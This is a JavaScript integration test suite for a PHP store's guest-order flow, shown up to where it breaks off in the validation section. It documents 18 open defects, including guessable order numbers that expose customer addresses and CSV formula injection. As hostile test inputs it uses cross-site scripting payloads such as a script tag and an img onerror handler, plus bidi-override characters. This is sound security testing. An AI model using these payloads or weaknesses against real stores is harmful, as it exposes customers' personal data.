// GUEST ORDERS, end to end: an order placed without signing in, from the POST to
// the warehouse mail, the lookups a stranger can make, the admin screens that
// show it, the routes that touch it afterwards, and what is left behind.
// Correctness AND privacy, over real HTTP against the real PHP and a real
// MariaDB. No mocks.
//
//   npm run test:guest-orders
//
// WHAT IT NEEDS
//   * a MariaDB with the store schema loaded (install.mysql.sql plus every
//     additive *.mysql.sql, exactly as scripts/sandbox.sh does it);
//   * a base store config (the file SPORTA_API_CONFIG_FILE would name) whose
//     db_* values reach that database;
//   * php and the mariadb client on the PATH.
// The suite starts its OWN php -S servers (it never needs the sandbox's ports),
// from a config of its own that is the base config plus a few overrides, and
// it writes only rows it can name afterwards: every track id, phone, email,
// admin account it creates is recorded and removed on the way out, and the
// stock of the variant it used is put back.
//
// POINTING IT SOMEWHERE ELSE (all optional; the defaults are the private
// instance this suite was written against, a scratch MariaDB on port 3397):
//   GUEST_HOME         directory of the private instance (default below)
//   GUEST_DB_ARGS      mariadb client arguments, split on spaces, ending with
//                      the database name. Default: --no-defaults -S
//                      $GUEST_HOME/run/mysql.sock -uroot guestchk
//                      The shared sandbox would be:  GUEST_DB_ARGS=sporta
//   GUEST_BASE_CONFIG  base store config file. Default $GUEST_HOME/config-main.php
//                      The shared sandbox would be:
//                      GUEST_BASE_CONFIG=dropin/php-store/config.php
//   GUEST_PORT_FROM    first of the free ports the suite may take (default 8341)
//   GUEST_RUN_CRON     1 (default) runs cron-fulfilment.php and cron-stock.php
//                      against that database to prove the warehouse mail and the
//                      24 h cash auto-cancel. They drain EVERY pending outbox row
//                      and release EVERY stale cash order, not just this suite's,
//                      so set 0 on a database somebody else is testing on.
//   GUEST_KEEP         1 keeps the suite's scratch directory (logs, mail, configs)
//   GUEST_STRICT       1 makes an open DEFECT line fail the run (exit 1). By
//                      default a DEFECT is printed and counted but does not fail
//                      the run, because the suite is also the evidence for them.
//   GUEST_EXTRA_LOGS   comma separated log files to search for personal data
//                      (default: $GUEST_HOME/logs/mariadb-error.log if it exists)
//
// OUTPUT. `ok` = the behaviour is right. `FAIL` = the suite's expectation was
// wrong or the system broke. `DEFECT <id>` = the system does something it should
// not, proven with the exact requests; `note` = an observation, counted nowhere.
// MEASURED, 2026-11-03, private MariaDB 10.11 + PHP 8.3, repo HEAD 899d2e2b plus this file:
//   336 ok, 0 FAIL, 18 open DEFECT lines. What each DEFECT id is (severity is mine):
//   G1  medium  the server takes any 6-30 alphanumerics as the order number, and that number is the
//               only credential for ?r=status, ?r=invoice (name + full address + items) and /knet/pay.php
//   G2  medium  no route or script erases or anonymises a guest (the Privacy page promises deletion);
//   G2b         the best available overwrite of the order leaves 11 other places holding the data
//   G3  medium  a phone number is typed, never verified: a stranger who orders under it first locks the
//   G3b         owner out for 60 s, and three cash orders under it block the owner's own cash order
//   G4  medium  the admin CSV writes guest-typed name/area/street/building/note without neutralising = + - @
//   G5  medium  an admin address correction does not reach the warehouse picking list (outbox untouched)
//   G6  low     the audit trail says "customer" was edited, not which order, field or old value
//   G7  low     bidi override and zero-width characters survive in names and notes
//   G8  low     a newline in the note is deleted, not replaced, so two lines of directions run together
//   G9  low     register answers 409 account_not_created: it says which emails are customers
//   G10 low     a browser that thinks it is signed in but has a dead session places a guest order, silently
//   G10b medium customer sessions fall to PHP's default 1440 s garbage collection, not the 8 h / 7 d the code states
//   G11 low     the order number is in every status / invoice / pay.php URL, so in every access log
//   G12 low     the order response returns the sequential database id (reveals order volume)
//   G13 low     ?r[]=x answers 500 {"error":"failed"}
//   G14 low     /knet/pay.php has no rate limit: anyone with a track id can burn the order's attempt counter
//   G15 low     admin search by phone is a GET (?search=, crm_list&q=, crm_detail&key=phone:965…), so in the access log
//   Everything else (about 320 checks) is the behaviour being right: the server prices, the phone is
//   canonicalised, a guest order is never attached to an account by phone or email, status/invoice/returns/
//   assistant/review/support answer one thing for a wrong and an unknown identifier and never carry another
//   order's data, the cooldown/cap/route limits hold under 20 parallel identical requests, the sweeper and
//   the do-not-ship mail work, and no request, log line or table outside the intended ones holds personal data.
import { spawn, execFile } from 'node:child_process'
import http from 'node:http'
import { createHmac, randomBytes } from 'node:crypto'
import { mkdtempSync, writeFileSync, readFileSync, readdirSync, existsSync, mkdirSync, rmSync } from 'node:fs'
import net from 'node:net'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { promisify } from 'node:util'
import { makeTrackId } from '../src/lib/attempt.js'

const run = promisify(execFile)
const ROOT = new URL('..', import.meta.url).pathname
const STORE_DIR = join(ROOT, 'dropin/php-store')
const KNET_DIR = join(ROOT, 'dropin/php-knet')
const MTA = join(ROOT, 'scripts/fake-mta.sh')

const HOME = process.env.GUEST_HOME
  ?? '/tmp/claude-0/-home-user-wain/a128f64c-8c94-5bf5-b35a-38b83867e084/scratchpad/guestchk'
const DB_ARGS = (process.env.GUEST_DB_ARGS ?? `--no-defaults -S ${HOME}/run/mysql.sock -uroot guestchk`).split(/\s+/).filter(Boolean)
const BASE_CONFIG = process.env.GUEST_BASE_CONFIG ?? join(HOME, 'config-main.php')
const PORT_FROM = Number(process.env.GUEST_PORT_FROM ?? 8341)
const RUN_CRON = (process.env.GUEST_RUN_CRON ?? '1') === '1'
const STRICT = process.env.GUEST_STRICT === '1'

if (!existsSync(BASE_CONFIG)) {
  console.error(`guest-orders-test: base store config not found: ${BASE_CONFIG}\n` +
    'Point it at a database and a config of your own (see the header): GUEST_BASE_CONFIG=<file> GUEST_DB_ARGS="<mariadb args> <db>"')
  process.exit(2)
}

let passes = 0, fails = 0, defects = 0
const defectList = []
const ok = (n, d = '') => { passes++; console.log(`ok   ${n}${d ? `  — ${d}` : ''}`) }
const bad = (n, d = '') => { fails++; console.log(`FAIL ${n}${d ? `  — ${d}` : ''}`) }
const is = (c, n, d = '') => (c ? ok(n, d) : bad(n, d))
// A defect is a statement of the RIGHT behaviour: ok when it holds, DEFECT when not.
const defect = (id, c, n, d = '') => {
  if (c) return ok(`${id} ${n}`, d)
  defects++; defectList.push(id)
  console.log(`DEFECT ${id}  ${n}${d ? `  — ${d}` : ''}`)
}
const note = (n, d = '') => console.log(`note ${n}${d ? `  — ${d}` : ''}`)
const head = (t) => console.log(`\n=== ${t} ${'='.repeat(Math.max(0, 66 - t.length))}`)
const section = async (t, fn) => {
  head(t)
  try { await fn() } catch (e) { bad(`${t} crashed`, String(e?.stack ?? e).split('\n').slice(0, 3).join(' | ')) }
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms))

// -------------------------------------------------------------------- database
const dbRun = async (q) => (await run('mariadb', [...DB_ARGS.slice(0, -1), '--default-character-set=utf8mb4', '-N', '-B', '-e', q, DB_ARGS.at(-1)], { maxBuffer: 64 << 20 })).stdout
const unesc = (s) => s.replace(/\\(\\|t|n|0)/g, (_, c) => ({ '\\': '\\', t: '\t', n: '\n', 0: '\0' })[c])
const sql = async (q) => (await dbRun(q)).replace(/\n$/, '')
const rows = async (q) => { const o = await dbRun(q); return o === '' ? [] : o.replace(/\n$/, '').split('\n').map((l) => l.split('\t').map(unesc)) }
const one = async (q) => (await rows(q))[0]?.[0] ?? null
const lit = (s) => `'${String(s).replace(/\\/g, '\\\\').replace(/'/g, "''")}'`
const inList = (a) => (a.length ? a.map(lit).join(',') : "''")

// ------------------------------------------------------------------- identities
const TAG = randomBytes(3).toString('hex').toUpperCase().slice(0, 5) // 5 hex chars
const TRACKS = new Set(), PHONES = new Set(), EMAILS = new Set()
let seq = 0
const newTrack = () => { const t = `SPGC${TAG}${String(++seq).padStart(4, '0')}`; TRACKS.add(t); return t }
const rnd = (n) => Array.from(randomBytes(n), (b) => b % 10).join('')
const newLocal = () => '569'[randomBytes(1)[0] % 3] + rnd(7)            // 8 digits a Kuwaiti mobile may start with
const newPhone = () => { const p = newLocal(); PHONES.add('965' + p); return p }
const usedIps = new Set()
const newIp = () => { let ip; do { ip = `10.${randomBytes(1)[0]}.${randomBytes(1)[0]}.${1 + (randomBytes(1)[0] % 250)}` } while (usedIps.has(ip)); usedIps.add(ip); return ip }
const newSrc = () => `127.${100 + (randomBytes(1)[0] % 100)}.${randomBytes(1)[0]}.${1 + (randomBytes(1)[0] % 250)}` // a loopback source address of its own
const newEmail = () => { const e = `gc-${TAG.toLowerCase()}-${seq++}-${randomBytes(2).toString('hex')}@guest-orders.invalid`; EMAILS.add(e); return e }

// ------------------------------------------------------------------------ http
// node:http with a chosen SOURCE address: every 127.x.y.z is this machine, so a
// server that does not trust forwarded headers still sees a different client.
function request(base, method, path, { headers = {}, body, raw, from, timeout = 30000 } = {}) {
  return new Promise((resolve) => {
    const u = new URL(base + path)
    const data = raw !== undefined ? raw : body === undefined ? undefined : typeof body === 'string' ? body : JSON.stringify(body)
    const t0 = process.hrtime.bigint()
    const req = http.request({
      host: u.hostname, port: u.port, path: u.pathname + u.search, method, agent: false, timeout,
      localAddress: from,
      headers: { ...(data !== undefined ? { 'Content-Length': Buffer.byteLength(data) } : {}), ...headers },
    }, (res) => {
      const chunks = []
      res.on('data', (c) => chunks.push(c))
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8')
        let json = null
        try { json = JSON.parse(text) } catch { /* not JSON */ }
        resolve({ status: res.statusCode, headers: res.headers, text, json, ms: Number(process.hrtime.bigint() - t0) / 1e6 })
      })
    })
    req.on('timeout', () => req.destroy(new Error('timeout')))
    req.on('error', (e) => resolve({ status: 0, error: e.message, text: '', json: null, headers: {}, ms: 0 }))
    if (data !== undefined) req.write(data)
    req.end()
  })
}
const J = { 'Content-Type': 'application/json' }
const CUST = { ...J, 'X-Sporta-Customer': '1' }
const get = (b, route, o = {}) => request(b, 'GET', `/api.php?r=${route}`, o)
const post = (b, route, body, o = {}) => request(b, 'POST', `/api.php?r=${route}`, { ...o, body, headers: { ...J, ...(o.headers ?? {}) } })

// ------------------------------------------------------------- servers + config
const TMP = mkdtempSync(join(tmpdir(), 'guest-orders-'))
const MAILDIR = join(TMP, 'mail'); mkdirSync(MAILDIR)
const LOGDIR = join(TMP, 'logs'); mkdirSync(LOGDIR)
const PRIV = join(TMP, 'private'); mkdirSync(PRIV)
const SESS = join(TMP, 'sessions'); mkdirSync(SESS)
const RL_SECRET = 'guest-orders-test-rl-' + TAG
const CRON_KEY = 'guest-orders-cron-key-' + TAG
const phpStr = (s) => `'${String(s).replace(/\\/g, '\\\\').replace(/'/g, "\\'")}'`
const phpVal = (v) => (typeof v === 'number' ? String(v) : Array.isArray(v) ? `[${v.map(phpStr).join(', ')}]` : phpStr(v))
const writeConfig = (file, extra) => writeFileSync(file,
  `<?php\nreturn [\n${Object.entries(extra).map(([k, v]) => `  ${phpStr(k)} => ${phpVal(v)},`).join('\n')}\n] + (require ${phpStr(BASE_CONFIG)});\n`)
const OVERRIDES = {
  rate_limit_secret: RL_SECRET, cron_key: CRON_KEY, admin_session_dir: SESS,
  warehouse_email: 'warehouse@guest-orders.invalid', mail_from: 'cs@sporta.com.kw', mail_reply_to: 'cs@sporta.com.kw',
  admin_mail_from: 'cs@sporta.com.kw', customer_mail_from: 'cs@sporta.com.kw', cod_hold_hours: 24,
}
const rlKey = (bucket, id) => createHmac('sha256', RL_SECRET).update(`${bucket}|${id}`).digest('hex').slice(0, 32)

const procs = []
const stopAll = () => { for (const p of procs) { try { p.kill() } catch { /* gone */ } } }
process.on('exit', stopAll)
const isFree = (p) => new Promise((res) => {
  const s = net.createServer().once('error', () => res(false)).once('listening', () => s.close(() => res(true))).listen(p, '127.0.0.1')
})
let nextPort = PORT_FROM
const freePort = async () => { for (let p = nextPort; p < nextPort + 60; p++) if (await isFree(p)) { nextPort = p + 1; return p } throw new Error('no free port') }
const phpEnv = (cfgFile) => ({ ...process.env, SPORTA_API_CONFIG_FILE: cfgFile, SPORTA_PRIVATE_CONFIG_DIR: PRIV, PHP_CLI_SERVER_WORKERS: '8' })
const phpArgs = (errlog) => ['-d', `sendmail_path=sh ${MTA} ${MAILDIR}`, '-d', `error_log=${errlog}`, '-d', 'log_errors=1']
async function startStore(name, cfg, phpFlags = []) {
  const file = join(TMP, `config-${name}.php`)
  writeConfig(file, { ...OVERRIDES, ...cfg })
  const port = await freePort()
  const out = join(LOGDIR, `php-${name}.out`)
  const p = spawn('php', [...phpArgs(join(LOGDIR, `php-${name}-error.log`)), ...phpFlags, '-S', `127.0.0.1:${port}`, '-t', STORE_DIR], {
    stdio: ['ignore', (await import('node:fs')).openSync(out, 'a'), (await import('node:fs')).openSync(out, 'a')], env: phpEnv(file),
  })
  procs.push(p)
  for (let i = 0; i < 80; i++) {
    await sleep(100)
    const r = await request(`http://127.0.0.1:${port}`, 'GET', '/api.php?r=checkout_config')
    if (r.status === 200) return { base: `http://127.0.0.1:${port}`, cfgFile: file, port }
  }
  throw new Error(`store ${name} did not start`)
}
const LOOP = ['127.0.0.0/8']
// The private config directory the gateways read (SPORTA_PRIVATE_CONFIG_DIR): a
// KNET config of the sandbox's shape, pointed at the database under test.
async function writeKnetConfig() {
  const code = `
    $b = require ${phpStr(BASE_CONFIG)};
    $c = require ${phpStr(join(KNET_DIR, 'config.example.php'))};
    $c['env'] = 'test'; $c['test_url'] = 'http://127.0.0.1:1/fake-knet-bank.php';
    $c['tranportal_id'] = 'TESTID001'; $c['tranportal_password'] = 'testpass'; $c['resource_key'] = 'abcdef0123456789';
    $c['response_url'] = 'http://127.0.0.1:1/callback.php'; $c['error_url'] = 'http://127.0.0.1:1/callback.php';
    $c['result_page_url'] = 'https://www.sporta.com.kw/payment/result';
    $c['log_file'] = ${phpStr(join(LOGDIR, 'knet-payments.log'))};
    $c['mysql_host'] = $b['db_host']; $c['mysql_name'] = $b['db_name']; $c['mysql_user'] = $b['db_user']; $c['mysql_pass'] = $b['db_pass'];
    file_put_contents(${phpStr(join(PRIV, 'knet-config.php'))}, "<?php\\nreturn " . var_export($c, true) . ";\\n");`
  await run('php', ['-r', code])
}
const cli = async (script, arg) => {
  const file = join(TMP, 'config-cli.php')
  if (!existsSync(file)) writeConfig(file, { ...OVERRIDES, order_cooldown_seconds: 0, trusted_proxy_ips: [] })
  const { stdout } = await run('php', [...phpArgs(join(LOGDIR, 'php-cli-error.log')), join(STORE_DIR, script), arg], { env: phpEnv(file), maxBuffer: 16 << 20 })
  try { return JSON.parse(stdout) } catch { return { raw: stdout } }
}
// cron-fulfilment takes 20 rows a run (and --run drains every pending row in the database), so loop.
const drainFulfilment = async () => {
  let sent = 0
  for (let i = 0; i < 30; i++) { const o = await cli('cron-fulfilment.php', '--run'); sent += Number(o.sent ?? 0); if (!(Number(o.claimed ?? 0) > 0)) break }
  return sent
}
const mails = () => readdirSync(MAILDIR).filter((f) => f.endsWith('.eml')).sort().map((f) => ({ f, text: readFileSync(join(MAILDIR, f), 'utf8') }))

// -------------------------------------------------------------------- fixtures
const JACKET = 'cloudsoft-jacket-army-green'   // sized (L)
const ACC = 'cagliari-calcio-backpack'          // no size rows
let stockRestore = null, stockRestoreM = null
const jacketStock = async () => Number(await one(`select stock from product_variants where slug=${lit(JACKET)} and size='L'`))
const price = async (slug) => Number(await one(`select price from products where slug=${lit(slug)}`))
const baseCustomer = (over = {}) => ({
  name: 'Guest Check', phone: newPhone(), governorate: 'hawalli', area: 'Salmiya', block: '4',
  street: `GCST${TAG}`, building: '5', floor: '2', flat: '7', note: `NOTE${TAG} ring twice`, ...over,
})
let B, C, D, K // B: forwarded headers trusted, no cooldown. C: trusted + 60 s cooldown. D: untrusted + 60 s cooldown. K: KNET gateway
async function placeOrder(server, o = {}) {
  const base = server.base ?? server
  const track = o.track === undefined ? newTrack() : o.track
  if (typeof track === 'string') TRACKS.add(track)
  const customer = o.customer ?? baseCustomer()
  if (typeof customer?.phone === 'string') { const d = customer.phone.replace(/\D/g, ''); if (d.length >= 8) PHONES.add('965' + d.slice(-8)) }
  const body = o.rawBody !== undefined ? undefined : {
    track_id: track, payment_method: o.method ?? 'cod', items: o.items ?? [{ slug: ACC, qty: 1 }], customer, ...(o.extra ?? {}),
  }
  const headers = { ...(o.ip ? { 'X-Forwarded-For': o.ip } : {}), ...(o.headers ?? {}) }
  const res = o.rawBody !== undefined
    ? await request(base, 'POST', '/api.php?r=order', { raw: o.rawBody, headers, from: o.from })
    : await post(base, 'order', body, { headers, from: o.from })
  return { ...res, track, body, customer }
}
const orderRow = async (track) => {
  const r = await rows(`select id, customer_account_id, customer_name, customer_phone, customer_governorate, customer_area, customer_block,
      customer_street, customer_building, customer_floor, customer_flat, customer_note, payment_method, payment_status, fulfilment_status,
      stock_claimed, amount, customer_lang from orders where track_id = ${lit(track)}`)
  if (!r[0]) return null
  const k = ['id', 'account', 'name', 'phone', 'gov', 'area', 'block', 'street', 'building', 'floor', 'flat', 'note', 'method', 'pay', 'ful', 'claimed', 'amount', 'lang']
  return Object.fromEntries(k.map((x, i) => [x, r[0][i] === 'NULL' ? null : r[0][i]]))
}
const countOrders = async (tracks) => Number(await one(`select count(*) from orders where track_id in (${inList(tracks)})`))
const PII_KEYS = ['customer_name', 'customer_phone', 'phone', 'street', 'note', 'name']

// ============================================================================
// SETUP
// ============================================================================
await section('SETUP  private servers, fixtures', async () => {
  is((await one('select count(*) from products')) > 0, 'the database has the catalogue')
  await writeKnetConfig()
  B = await startStore('xff', { order_cooldown_seconds: 0, trusted_proxy_ips: LOOP })
  C = await startStore('cd-xff', { order_cooldown_seconds: 60, trusted_proxy_ips: LOOP })
  D = await startStore('cd-plain', { order_cooldown_seconds: 60, trusted_proxy_ips: [] })
  note('stores', `B ${B.port} (no cooldown, forwarded headers trusted), C ${C.port} (60 s, trusted), D ${D.port} (60 s, NOT trusted)`)
  const cfgv = (await get(B.base, 'checkout_config')).json
  is(cfgv?.methods?.includes('cod'), 'cash on delivery is offered', JSON.stringify(cfgv?.methods))
  stockRestore = Number(await one(`select stock from product_variants where slug=${lit(JACKET)} and size='L'`))
  stockRestoreM = Number(await one(`select stock from product_variants where slug=${lit(JACKET)} and size='M'`))
  await sql(`update product_variants set stock = 500 where slug=${lit(JACKET)} and size in ('L','M')`)
  is((await jacketStock()) === 500, 'the test garment has a known shelf', `${JACKET} L = 500 (was ${stockRestore})`)
})

// ============================================================================
// 1  A VALID GUEST COD ORDER
// ============================================================================
let g1 = null
await section('1  a valid guest cash order: row, stock, response, warehouse message, track id', async () => {
  const before = await jacketStock()
  const pj = await price(JACKET)
  const cust = baseCustomer({ name: `Fatima ${TAG}`, phone: '+965 5' + rnd(3) + ' ' + rnd(4), note: `Gate B, ring twice ${TAG}` })
  const r = await placeOrder(B, { items: [{ slug: JACKET, qty: 2, size: 'l', fit: 'Oversize' }], customer: cust, ip: newIp(),
    extra: { lang: 'en', attribution: { utm_source: 'ig', utm_medium: 'story', utm_campaign: 'eid', referrer_host: 'instagram.com' } } })
  g1 = r
  is(r.status === 200, 'a guest order is accepted without any account or header', `HTTP ${r.status} ${r.text.slice(0, 120)}`)
  const keys = Object.keys(r.json ?? {}).sort()
  is(keys.join(',') === 'amount,delivery,discount,order_id,payment_method,subtotal,track_id',
    'the response carries only what the browser needs', `fields: ${keys.join(', ')}`)
  is(r.json?.amount === pj * 2 + 1 && r.json?.subtotal === pj * 2 && r.json?.delivery === 1, 'the amount is priced on the server', `2 x ${pj} + 1.000 = ${r.json?.amount}`)
  const txt = r.text
  is(!txt.includes(cust.name) && !txt.includes(cust.phone.replace(/\D/g, '').slice(-8)) && !txt.includes(cust.street) && !txt.includes(cust.note),
    'and no name, phone, address or note comes back in it')
  is(Number.isInteger(r.json?.order_id), 'the response carries the database id of the order', `order_id ${r.json?.order_id} (a sequential integer)`)
  const o = await orderRow(r.track)
  is(o && o.account === null, 'the order row has NO customer account', `customer_account_id = ${o?.account}`)
  is(/^965[569]\d{7}$/.test(o?.phone ?? ''), 'the phone is stored in the canonical form', o?.phone)
  is(o?.pay === 'pending' && o?.ful === 'unfulfilled' && o?.method === 'cod' && o?.claimed === '1', 'pending / unfulfilled / cash / stock claimed')
  is(o?.name === cust.name && o?.note === cust.note && o?.street === cust.street && o?.lang === 'en', 'name, address, note and language are stored as typed')
  is(Number(await one(`select count(*) from orders where track_id=${lit(r.track)} and utm_source='ig' and utm_medium='story' and utm_campaign='eid' and referrer_host='instagram.com'`)) === 1, 'the ad attribution is stored on the order')
  const after = await jacketStock()
  is(before - after === 2, 'stock moved by exactly the quantity ordered', `${before} -> ${after}`)
  const ob = await rows(`select kind, payload from fulfilment_outbox where order_id = ${o.id}`)
  is(ob.length === 1 && ob[0][0] === 'new', 'exactly one warehouse message is queued with the order')
  const pl = JSON.parse(ob[0]?.[1] ?? '{}')
  is(pl.customer?.name === cust.name && pl.customer?.phone === o.phone && pl.address?.note === cust.note && pl.collect_cash === true,
    'that message carries the name, phone, full address and note, and says COLLECT CASH')
  note('the outbox payload keeps the personal data until a person deletes the row; no job prunes it')

  const st = (await get(B.base, `status&id=${r.track}`, { headers: { 'X-Forwarded-For': newIp() } })).json
  is(st?.payment_status === 'pending' && st?.fulfilment_status === 'unfulfilled', 'the order can be tracked by its number', JSON.stringify(st))

  if (RUN_CRON) {
    const before = mails().length
    const out = await drainFulfilment()
    const m = mails().slice(before).find((x) => x.text.includes(r.track))
    is(!!m, 'cron-fulfilment mails the warehouse for the new order', `${out} message(s) sent in this drain`)
    if (m) {
      const subj = Buffer.from((m.text.match(/^Subject: =\?UTF-8\?B\?([^?]+)\?=/m) ?? [])[1] ?? '', 'base64').toString('utf8')
      is(subj.includes(r.track) && /COLLECT CASH/.test(subj), 'the subject carries the order number and the cash instruction', subj)
      is(m.text.includes(cust.name) && m.text.includes('+' + o.phone) && m.text.includes(cust.note), 'the body gives the courier the name, +phone and note')
      is(/^To: warehouse@guest-orders\.invalid/m.test(m.text) && !/^(Cc|Bcc):/mi.test(m.text), 'the warehouse is the only recipient: no Cc or Bcc copy of the customer data')
    }
    const left = Number(await one(`select count(*) from fulfilment_outbox where order_id=${o.id} and sent_at is not null`))
    is(left === 1, 'and the outbox row is marked sent')
  } else note('GUEST_RUN_CRON=0: the warehouse mail is not run')

  // Track id: format and entropy of what the SHIPPED client mints.
  const ids = Array.from({ length: 50 }, () => makeTrackId())
  const uniq = new Set(ids)
  is(uniq.size === 50, '50 track ids made by the shipped client are all different')
  is(ids.every((i) => /^SP[0-9A-Z]{4,28}$/.test(i)), 'and all match the format the server accepts (alphanumeric, <= 30)', ids[0])
  let up = 0; for (let i = 1; i < ids.length; i++) if (ids[i] > ids[i - 1]) up++
  is(up > 12 && up < 37, 'they are not sequential or sorted', `${up}/49 increase`)
  const lens = ids.map((i) => i.length)
  is(Math.min(...lens) >= 10, 'they are long enough', `length ${Math.min(...lens)}..${Math.max(...lens)}`)
  note('entropy of a shipped id', 'SP + two 32-bit random numbers in base 36 => at most 64 bits, about 62 once the base-36 digits are counted')
  note('the server does NOT mint or check this id (see 5: a 6 character id is accepted and becomes the only credential for the order)')
})

// ============================================================================
// 2  VALIDATION AND HOSTILE INPUT
// ============================================================================
await section('2  validation: names, phones, address fields, hostile text, malformed requests', async () => {
  const accepted = []
  // [label, customer overrides, expected token or null (= accepted), stored check]
  const T = (n) => 'x'.repeat(n)
  const names = [
    ['name 2 chars', { name: 'Al' }, null],
    ['name 80 chars', { name: T(80) }, null],
    ['name 81 chars', { name: T(81) }, 'too_long_name'],
    ['name 1 char', { name: 'A' }, 'missing_name'],
    ['name only spaces', { name: '    ' }, 'missing_name'],
    ['name missing', { name: undefined }, 'missing_name'],
    ['name null', { name: null }, 'missing_name'],
    ['name a number', { name: 12345 }, 'invalid_name'],
    ['name an array (duplicate field)', { name: ['Ali', 'Omar'] }, 'invalid_name'],
    ['name an object', { name: { first: 'Ali' } }, 'invalid_name'],
    ['name Arabic', { name: 'فاطمة الصباح' }, null],
    ['name with emoji', { name: 'Ali 🏃 Runner' }, null],
    ['name 4097 bytes', { name: T(4097) }, 'too_long_name'],
  ]
  const phones = [
    ['phone +965 5xxx xxxx', { phone: '+965 5' + rnd(3) + ' ' + rnd(4) }, null, true],
    ['phone 965xxxxxxxx', { phone: '9656' + rnd(7) }, null, true],
    ['phone 00965xxxxxxxx', { phone: '009659' + rnd(7) }, null, true],
    ['phone with dashes', { phone: '5' + rnd(2) + '-' + rnd(3) + '-' + rnd(2) }, null, true],
    ['phone in Arabic-Indic digits', { phone: '٩٦٥٦' + '١٢٣٤٥٦٧' }, null, true],
    ['phone 8 digits starting 9 (after 965 strip ambiguity)', { phone: '9' + rnd(7) }, null, true],
    ['phone too short (7 digits)', { phone: '5' + rnd(6) }, 'invalid_phone'],
    ['phone letters', { phone: 'call me maybe' }, 'invalid_phone'],
    ['phone starting 1 (+965 12345678)', { phone: '+965 12345678' }, 'invalid_phone'],
    ['phone a landline (starts 2)', { phone: '2' + rnd(7) }, 'invalid_phone'],
    ['phone a UK number', { phone: '+44 7911 123456' }, 'invalid_phone'],
    ['phone two numbers glued', { phone: '+965 5123 4567 / 6123 4567' }, 'invalid_phone'],
    ['phone as a JSON number', { phone: 51234567 }, 'invalid_phone'],
    ['phone null', { phone: null }, 'invalid_phone'],
    ['phone an array', { phone: ['51234567'] }, 'invalid_phone'],
    ['phone empty', { phone: '' }, 'invalid_phone'],
  ]
  const addr = [
    ['area 60', { area: T(60) }, null], ['area 61', { area: T(61) }, 'too_long_area'], ['area 1', { area: 'a' }, 'missing_area'], ['area missing', { area: undefined }, 'missing_area'],
    ['block 12', { block: T(12) }, null], ['block 13', { block: T(13) }, 'too_long_block'], ['block missing', { block: undefined }, 'missing_block'],
    ['street 40', { street: T(40) }, null], ['street 41', { street: T(41) }, 'too_long_street'], ['street missing', { street: undefined }, 'missing_street'],
    ['building 24', { building: T(24) }, null], ['building 25', { building: T(25) }, 'too_long_building'], ['building missing', { building: undefined }, 'missing_building'],
    ['floor 16', { floor: T(16) }, null], ['floor 17', { floor: T(17) }, 'too_long_floor'], ['floor empty', { floor: '' }, null],
    ['flat 16', { flat: T(16) }, null], ['flat 17', { flat: T(17) }, 'too_long_flat'],
    ['note 280', { note: T(280) }, null], ['note 281', { note: T(281) }, 'too_long_note'], ['note 280 emoji', { note: '😀'.repeat(280) }, null],
    ['note 280 Arabic', { note: 'ا'.repeat(280) }, null], ['note 4097 bytes', { note: T(4097) }, 'too_long_note'], ['note an array', { note: ['a', 'b'] }, 'invalid_note'],
    ['governorate Hawalli (case)', { governorate: 'Hawalli' }, 'invalid_governorate'], ['governorate unknown', { governorate: 'mars' }, 'invalid_governorate'],
    ['governorate array', { governorate: ['hawalli'] }, 'invalid_governorate'], ['governorate missing', { governorate: undefined }, 'invalid_governorate'],
  ]
  for (const [label, over, tok, isPhone] of [...names, ...phones, ...addr]) {
    const customer = baseCustomer(over)
    for (const k of Object.keys(over)) if (over[k] === undefined) delete customer[k]
    if (isPhone) PHONES.add('965' + String(customer.phone).replace(/[^\d٠-٩]/g, '').slice(-8))
    if (!isPhone && !('phone' in over)) { /* keeps the fresh phone baseCustomer made */ }
    const r = await placeOrder(B, { customer, ip: newIp() })
    if (tok === null) {
      is(r.status === 200, `accepted: ${label}`, r.status === 200 ? '' : r.text.slice(0, 100))
      if (r.status === 200) accepted.push({ label, r, customer })
    } else {
      is(r.status === 400 && r.json?.error === tok, `refused: ${label}`, `HTTP ${r.status} ${r.json?.error}`)
      is((await countOrders([r.track])) === 0, `  and nothing was written for it`)
    }
  }
  // Phone variants: every accepted spelling lands on the canonical 965xxxxxxxx.
  for (const a of accepted.filter((x) => x.label.startsWith('phone'))) {
    const o = await orderRow(a.r.track)
    const digits = String(a.customer.phone).replace(/[٠-٩]/g, (d) => '٠١٢٣٤٥٦٧٨٩'.indexOf(d)).replace(/\D/g, '')
    const want = '965' + digits.replace(/^00965/, '').replace(/^965(?=\d{8})/, '').slice(-8)
    is(o?.phone === want, `  stored canonical: ${a.label}`, `${a.customer.phone} -> ${o?.phone}`)
  }
  // Stored value checks for the text that must survive intact
  const em = accepted.find((x) => x.label === 'name with emoji'); const emRow = em && await orderRow(em.r.track)
  is(emRow?.name === 'Ali 🏃 Runner', 'emoji and Arabic survive MariaDB (utf8mb4)', emRow?.name)
  const ar = accepted.find((x) => x.label === 'name Arabic'); const arRow = ar && await orderRow(ar.r.track)
  is(arRow?.name === 'فاطمة الصباح', 'Arabic survives', arRow?.name)
  const e280 = accepted.find((x) => x.label === 'note 280 emoji'); const e280r = e280 && await orderRow(e280.r.track)
  is([...(e280r?.note ?? '')].length === 280, '280 emoji (1120 bytes) are stored whole in the 280 character note')

  // Hostile text: stored raw, controlled on output.
  const hostile = {
    name: '<script>alert(1)</script>', note: '"><img src=x onerror=alert(1)> ‮evil​ ' + TAG,
  }
  const hr = await placeOrder(B, { customer: baseCustomer(hostile), ip: newIp() })
  is(hr.status === 200, 'script and markup in the name and note are accepted as text (not rejected)', hr.text.slice(0, 80))
  const hrow = await orderRow(hr.track)
  is(hrow?.name === hostile.name && hrow?.note === hostile.note, 'and stored raw: the escaping happens where it is shown, not at the door')
  const inv = await get(B.base, `invoice&id=${hr.track}`, { headers: { 'X-Forwarded-For': newIp() } })
  is(!/<script|<img/i.test(inv.text) && inv.text.includes('\\u003Cscript\\u003E'), 'the invoice JSON hex-escapes < > & so it is inert even if dropped into HTML')
  defect('G7', !/[‪-‮⁦-⁩​-‏]/.test(hrow?.note ?? ''), 'bidirectional override and zero-width characters are removed from free text',
    `stored note keeps U+202E / U+200B (${JSON.stringify(hrow?.note)}): a courier's screen shows "evil" reversed and the text cannot be searched`)
  // control characters
  const cc = await placeOrder(B, { customer: baseCustomer({ note: 'Ring twice\nGate B\r\n\tfloor 2\u0000x', name: 'Ali\tBaba' }), ip: newIp() })
  const ccRow = await orderRow(cc.track)
